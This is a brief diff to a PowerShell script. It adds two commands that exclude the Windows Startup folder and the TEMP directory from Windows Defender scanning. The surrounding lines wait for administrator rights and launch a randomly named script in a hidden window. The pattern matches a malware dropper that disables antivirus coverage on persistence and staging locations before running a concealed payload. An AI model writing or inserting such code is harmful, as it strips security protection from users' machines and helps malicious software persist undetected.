@@ -10,5 +10,7 @@ while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIde
     }
 }
 
+Add-MpPreference -ExclusionPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+Add-MpPreference -ExclusionPath "$env:TEMP"
 
 Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$tasks\AEQKCPrkuifY.ps1`"" -NoNewWindow -Wait
